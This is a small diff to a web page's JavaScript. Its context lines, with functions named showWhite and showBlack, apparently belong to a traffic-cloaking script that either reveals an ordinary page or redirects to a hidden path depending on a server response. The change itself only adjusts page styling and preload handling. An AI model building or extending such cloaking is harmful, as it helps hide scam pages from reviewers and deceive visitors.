@@ -23,6 +23,7 @@ const showWhite = () => {
   if (body) {
     body.classList.remove('hidden');
     body.removeAttribute('hidden');
+    body.style.overflow = '';
   }
 
   const preload = document.querySelector('#load_frame');
@@ -85,7 +86,7 @@ window.addEventListener('DOMContentLoaded', () => {
        
         showBlack(res.url + '/nf5nPY3n');
       } else {
-        preload.remove();
+        
         setTimeout(showWhite, 300);
       }
     })
